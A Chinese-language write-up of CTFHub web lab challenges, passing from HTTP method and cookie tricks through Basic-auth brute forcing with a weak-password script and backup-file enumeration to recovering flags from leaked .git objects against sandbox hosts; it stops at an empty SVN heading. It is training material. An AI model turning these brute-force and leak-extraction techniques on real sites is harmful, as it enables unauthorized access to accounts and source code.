
### 请求方式

根据提示，使用 `CTFHUB` 方式请求

```bash
$ curl -X CTFHUB "http://challenge-bf4d629e27103c15.sandbox.ctfhub.com:10800/index.php"
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"/>
    <title>CTFHub HTTP Method</title>
</head>
<body>

good job! ctfhub{0014f3ea8e1e7150b94cda4b}

</body>
</html>
```

flag: `ctfhub{0014f3ea8e1e7150b94cda4b}`

### 302 跳转

根据提示是重定向，不要 follow redirect 就可以了

```bash
$ curl -i "http://challenge-6e0231db9072babf.sandbox.ctfhub.com:10800/index.php"
HTTP/1.1 302 Moved Temporarily
Server: openresty/1.21.4.2
Date: Thu, 19 Dec 2024 08:51:03 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/5.6.40
Location: /index.html
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: X-Requested-With
Access-Control-Allow-Methods: *

ctfhub{fe6f22b094da541943d34f68}
```

flag: `ctfhub{fe6f22b094da541943d34f68}`

### Cookie

```bash
$ curl -i "http://challenge-69089ea35fc8ddac.sandbox.ctfhub.com:10800/"
HTTP/1.1 200 OK
Server: openresty/1.21.4.2
Date: Thu, 19 Dec 2024 08:52:15 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/5.6.40
Set-Cookie: admin=0
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: X-Requested-With
Access-Control-Allow-Methods: *

hello guest. only admin can get flag.
```

可以看到有个 cookie: `admin=0`。修改成 `admin=1`:

```bash
$ curl -i -H "Cookie: admin=1" "http://challenge-69089ea35fc8ddac.sandbox.ctfhub.com:10800/"
HTTP/1.1 200 OK
Server: openresty/1.21.4.2
Date: Thu, 19 Dec 2024 08:53:19 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/5.6.40
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: X-Requested-With
Access-Control-Allow-Methods: *

ctfhub{71c22e974f97fc93ec070b99}
```

flag: `ctfhub{71c22e974f97fc93ec070b99}`

### 基础认证

```bash
$ curl -i "http://challenge-9ab9e243ade97b54.sandbox.ctfhub.com:10800/flag.html"
HTTP/1.1 401 Unauthorized
Server: openresty/1.21.4.2
Date: Thu, 19 Dec 2024 08:54:25 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 179
Connection: keep-alive
WWW-Authenticate: Basic realm="Do u know admin ?"

<html>
<head><title>401 Authorization Required</title></head>
<body>
<center><h1>401 Authorization Required</h1></center>
<hr><center>nginx/1.16.1</center>
</body>
</html>
```

看到 `WWW-Authenticate: Basic realm="Do u know admin ?"`

查一下 `WwW-Authenticate` 这个 header 的文档，大致意思是，对于用户输入的账号 `admin` 和密码 `pass`，做以下处理：
1. 拼接成一个字符串，用冒号隔开：`admin:pass`
2. base64 encode：`YWRtaW46cGFzcwo=`
3. 在请求头中带上凭证：`Authorization: Basic YWRtaW46cGFzcwo=`

同时还给了一个附件，常见弱口令 top 100，那么题目要求就非常清晰了，写几行代码爆破一下就可以了

```python
import requests
import base64

wordlist: str = """
123456
password
line
12345678
qwerty
123456789
12345
1234
111111
1234567
<omitted ...>
"""

for mpass in wordlist.split("\n"):
    mkey = base64.b64encode(f"admin:{mpass}".encode()).decode()
    print(f"Trying: {mpass}")
    resp = requests.get(
        "http://challenge-9ab9e243ade97b54.sandbox.ctfhub.com:10800/flag.html",
        headers= {
            "Authorization": f"Basic {mkey}"
        }
    )
    if resp.status_code != 401:
        print(resp.headers)
        print(resp.text)
        break
```

```bash
<omitted ...>
Trying: 1234567
Trying: dragon
Trying: 123123
Trying: baseball
{'Server': 'openresty/1.21.4.2', 'Date': 'Thu, 19 Dec 2024 09:13:52 GMT', 'Content-Type': 'text/html; charset=utf-8', 'Transfer-Encoding': 'chunked', 'Connection': 'keep-alive', 'Last-Modified': 'Thu, 19 Dec 2024 08:53:47 GMT', 'ETag': 'W/"6763df1b-21"', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Headers': 'X-Requested-With', 'Access-Control-Allow-Methods': '*', 'Content-Encoding': 'gzip'}
ctfhub{705a46bedb9bbd76d64baf73}
```

flag: `ctfhub{705a46bedb9bbd76d64baf73}`

### 响应包源代码

不用开游戏，直接翻 html 源代码就可以看到 flag

flag: `ctfhub{6ad3eb5fe2ea7d5b236b8cba}`

### 目录遍历

```bash
$ curl "http://challenge-b89bdb40dfbfe07c.sandbox.ctfhub.com:10800/flag_in_here/4/2/flag.txt"
ctfhub{3fa42395c00b66ed7c32fa09}
```

flag: `ctfhub{3fa42395c00b66ed7c32fa09}`

### PHPINFO

直接网页搜索就好了

flag: `ctfhub{f9c8cec1765b37b862dcc4fa}`

### 网站源码

根据题目描述，给了可能的文件名和后缀，那么，开始爆破吧

```python
import requests
import typing
import itertools

exts: typing.List[str] = [
    'tar', 'tar.gz', 'zip', 'rar'
]

filenames: typing.List[str] = [
    'web', 'website', 'backup', 'back', 'www', 'wwwroot', 'temp'
]

combinations: typing.List[str] = ['{}.{}'.format(filename, ext) for filename, ext in itertools.product(filenames, exts)]

for f in combinations:
    url: str = f"http://challenge-57f733049705e700.sandbox.ctfhub.com:10800/{f}"
    resp = requests.get(url)
    print(f"Trying: {f}")
    if (resp.status_code == 200):
        print(f"Found: {f}")
        with open(f, 'wb') as file:
            file.write(resp.content)
        break
```

```bash
<omitted ...>
Trying: back.rar
Trying: www.tar
Trying: www.tar.gz
Trying: www.zip
Found: www.zip
```

下载解压文件，有个叫 `flag_255227411.txt` 的文件

```bash
$ curl "http://challenge-57f733049705e700.sandbox.ctfhub.com:10800/flag_255227411.txt"
ctfhub{7f5b8ac5b1a9068f814f0217}
```

flag: `ctfhub{7f5b8ac5b1a9068f814f0217}`

### bak 文件

```bash
$ curl "http://challenge-aec80717f912ca94.sandbox.ctfhub.com:10800/index.php.bak"
<!DOCTYPE html>
<html>
<head>
    <title>CTFHub 备份文件下载 - bak</title>
</head>
<body>
<?php

// FLAG: ctfhub{7eca46b4361c84fb3cc5279c}

echo "Flag in index.php source code.";
?>
</body>
</html>
```

flag: `ctfhub{7eca46b4361c84fb3cc5279c}`

### vim 缓存

```
$ wget "http://challenge-917fe927c2514035.sandbox.ctfhub.com:10800/.index.php.swp"

$ vim -r .index.php.swp
```

flag: `ctfhub{25bbafd258dfb2d994e43f46}`

### .DS_Store

找个工具一把梭：

```bash
$ pipenv run dumpall -u "http://challenge-ee2c7af2b2b35097.sandbox.ctfhub.com:10800/.DS_Store"

       ___                  ___   __   __ 
      / _ \__ ____ _  ___  / _ | / /  / / 
     / // / // /  ' \/ _ \/ __ |/ /__/ /__
    /____/\_,_/_/_/_/ .__/_/ |_/____/____/
                   /_/                    

    https://github.com/0xHJK/dumpall
    --------------------------------------------- 
                                       v0.3.2 HJK

Target: http://challenge-ee2c7af2b2b35097.sandbox.ctfhub.com:10800/.DS_Store
Output Directory: /home/kazusa/playground/challenge-ee2c7af2b2b35097.sandbox.ctfhub.com_10800

Module: dumpall.addons.dsdumper

[200] http://challenge-ee2c7af2b2b35097.sandbox.ctfhub.com:10800/aa050c423974ee3125db054c5d76bb6b.txt aa050c423974ee3125db054c5d76bb6b.txt
```

flag: `ctfhub{366885c612a6ddd17ba317cb}`

### Git 泄露 - Log

```bash
$ curl "http://challenge-33d2dab378983665.sandbox.ctfhub.com:10800/.git/logs/HEAD"
0000000000000000000000000000000000000000 3978780ede2ef9b711101198f88feaa05d074f3d CTFHub <sandbox@ctfhub.com> 1734602862 +0000	commit (initial): init
3978780ede2ef9b711101198f88feaa05d074f3d 05482e6b3a7fd31b7070135e6f0a9779b00ad490 CTFHub <sandbox@ctfhub.com> 1734602862 +0000	commit: add flag
05482e6b3a7fd31b7070135e6f0a9779b00ad490 a27987a9c3598c7ac256bd86e105193d14bbe608 CTFHub <sandbox@ctfhub.com> 1734602862 +0000	commit: remove flag
```

可以得知在 commit `05482e6b3a7fd31b7070135e6f0a9779b00ad490` 添加了 flag 文件

```bash
$ wget "http://challenge-33d2dab378983665.sandbox.ctfhub.com:10800/.git/objects/05/482e6b3a7fd31b7070135e6f0a9779b00ad490"

$ zlib-flate -uncompress < 482e6b3a7fd31b7070135e6f0a9779b00ad490 > output

$ cat output
commit 211tree 4f76c2d615138379c60b01fe1f431a6faaa221f3
parent 3978780ede2ef9b711101198f88feaa05d074f3d
author CTFHub <sandbox@ctfhub.com> 1734602862 +0000
committer CTFHub <sandbox@ctfhub.com> 1734602862 +0000

add flag
```

可以得知这次 commit 的 tree id 为 `4f76c2d615138379c60b01fe1f431a6faaa221f3`。继续下载这个文件：

```bash
$ wget "http://challenge-33d2dab378983665.sandbox.ctfhub.com:10800/.git/objects/4f/76c2d615138379c60b01fe1f431a6faaa221f3"

$ zlib-flate -uncompress < 76c2d615138379c60b01fe1f431a6faaa221f3 > output

$ xxd output
00000000: 7472 6565 2031 3231 0031 3030 3634 3420  tree 121.100644
00000010: 3130 3632 3731 3434 3839 3233 3835 322e  106271448923852.
00000020: 7478 7400 7ea4 4e76 376b db62 ab87 cc7a  txt.~.Nv7k.b...z
00000030: b101 94c1 4973 daa0 3130 3036 3434 2035  ....Is..100644 5
00000040: 3078 2e68 746d 6c00 9071 e0a2 4f65 4c88  0x.html..q..OeL.
00000050: aa97 a227 3ca5 95e3 01b7 ada5 3130 3036  ...'<.......1006
00000060: 3434 2069 6e64 6578 2e68 746d 6c00 2c59  44 index.html.,Y
00000070: e302 4e3b c350 9767 7820 4928 a21d 9ff4  ..N;.P.gx I(....
00000080: 2d01
```

得知这次 commit 中有个叫做 `106271448923852.txt` 的文件，哈希为 `7ea44e76376bdb62ab87cc7ab10194c14973daa0`

下载还原这个文件：

```bash
$ wget "http://challenge-33d2dab378983665.sandbox.ctfhub.com:10800/.git/objects/7e/a44e76376bdb62ab87cc7ab10194c14973daa0"

$ zlib-flate -uncompress < 7ea44e76376bdb62ab87cc7ab10194c14973daa0 > output

$ xxd output
00000000: 626c 6f62 2033 3300 6374 6668 7562 7b36  blob 33.ctfhub{6
00000010: 3635 6164 3731 3132 6238 3932 3934 6635  65ad7112b89294f5
00000020: 6661 3634 3766 367d 0a                   fa647f6}.
```

flag: `ctfhub{665ad7112b89294f5fa647f6}`

### Git 泄露 - Stash

```bash
$ curl "http://challenge-969c65bb8fb87c8e.sandbox.ctfhub.com:10800/.git/refs/stash"
60aca61375957983b9feccc84b3a9579be3f0d62

$ wget "http://challenge-969c65bb8fb87c8e.sandbox.ctfhub.com:10800/.git/objects/60/aca61375957983b9feccc84b3a9579be3f0d62"

$ zlib-flate -uncompress < aca61375957983b9feccc84b3a9579be3f0d62 > output

$ strings output
commit 281
tree b34c33de0d153cf72389bc66844a2291d8db3c0f
parent 5e2b7bbf9fb0db8f474396e2c32c11bc829e82b8
parent c62d9dea80687bfa4deaed96d8b8783c0bb989f4
author CTFHub <sandbox@ctfhub.com> 1734604766 +0000
committer CTFHub <sandbox@ctfhub.com> 1734604766 +0000
WIP on master: 5e2b7bb add flag
```

这次 commit 的 tree id 为 `b34c33de0d153cf72389bc66844a2291d8db3c0f`，同上下载分析文件：

```bash
$ wget "http://challenge-969c65bb8fb87c8e.sandbox.ctfhub.com:10800/.git/objects/b3/4c33de0d153cf72389bc66844a2291d8db3c0f"

$ zlib-flate -uncompress < 4c33de0d153cf72389bc66844a2291d8db3c0f > output

$ xxd output
00000000: 7472 6565 2031 3230 0031 3030 3634 3420  tree 120.100644
00000010: 3239 3535 3738 3530 3132 3230 3032 2e74  29557850122002.t
00000020: 7874 008f 4980 e11a cc6f 70c4 637d 8325  xt..I....op.c}.%
00000030: 0854 f006 d44b 5431 3030 3634 3420 3530  .T...KT100644 50
00000040: 782e 6874 6d6c 0090 71e0 a24f 654c 88aa  x.html..q..OeL..
00000050: 97a2 273c a595 e301 b7ad a531 3030 3634  ..'<.......10064
00000060: 3420 696e 6465 782e 6874 6d6c 002c 59e3  4 index.html.,Y.
00000070: 024e 3bc3 5097 6778 2049 28a2 1d9f f42d  .N;.P.gx I(....-
00000080: 01
```

叫做 `29557850122002.txt` 的文件，哈希为 `8f4980e11acc6f70c4637d83250854f006d44b54`

```bash
$ wget "http://challenge-969c65bb8fb87c8e.sandbox.ctfhub.com:10800/.git/objects/8f/4980e11acc6f70c4637d83250854f006d44b54"

$ zlib-flate -uncompress < 4980e11acc6f70c4637d83250854f006d44b54 > output

$ strings output
blob 33
ctfhub{7f3bae4a37ae8a6ced71528d}
```

flag: `ctfhub{7f3bae4a37ae8a6ced71528d}`

### Git 泄露 - index

```bash
$ wget "http://challenge-7e8654a5da958626.sandbox.ctfhub.com:10800/.git/index"

$ xxd index
00000000: 4449 5243 0000 0002 0000 0003 6764 03ae  DIRC........gd..
00000010: 0000 0000 6764 03ae 0000 0000 0020 0063  ....gd....... .c
00000020: 0026 094e 0000 81a4 0000 0000 0000 0000  .&.N............
00000030: 0000 0021 586c 7b38 9190 12b4 1525 417b  ...!Xl{8.....%A{
00000040: 1479 b7b2 f539 e063 0011 3434 3031 3633  .y...9.c..440163
00000050: 3235 3133 3236 312e 7478 7400 6516 36f6  2513261.txt.e.6.
00000060: 0000 0000 5e07 63c7 0000 0000 0020 0063  ....^.c...... .c
00000070: 0024 3652 0000 81a4 0000 0000 0000 0000  .$6R............
00000080: 0000 01ee 9071 e0a2 4f65 4c88 aa97 a227  .....q..OeL....'
00000090: 3ca5 95e3 01b7 ada5 0008 3530 782e 6874  <.........50x.ht
000000a0: 6d6c 0000 6516 80fc 0000 0000 5e48 ecac  ml..e.......^H..
000000b0: 0000 0000 0020 0063 0024 36a0 0000 81a4  ..... .c.$6.....
000000c0: 0000 0000 0000 0000 0000 008f 2c59 e302  ............,Y..
000000d0: 4e3b c350 9767 7820 4928 a21d 9ff4 2d01  N;.P.gx I(....-.
000000e0: 000a 696e 6465 782e 6874 6d6c 0000 0000  ..index.html....
000000f0: 0000 0000 5452 4545 0000 0019 0033 2030  ....TREE.....3 0
00000100: 0a67 0b73 f9a9 565e bda1 b0c5 29ad f332  .g.s..V^....)..2
00000110: d150 f33d b74c d232 3b23 a84e de95 3c90  .P.=.L.2;#.N..<.
00000120: 3e2a e3c1 949f f231 90                   >*.....1.
```

有一个叫做 `4401632513261.txt` 的文件，哈希为 `586c7b38919012b41525417b1479b7b2f539e063`

```bash
$ wget "http://challenge-7e8654a5da958626.sandbox.ctfhub.com:10800/.git/objects/58/6c7b38919012b41525417b1479b7b2f539e063"

$ zlib-flate -uncompress < 6c7b38919012b41525417b1479b7b2f539e063 > output

$ strings output
blob 33
ctfhub{4810073b50315a6ad0ca5286}
```

flag: `ctfhub{4810073b50315a6ad0ca5286}`

### SVN 泄露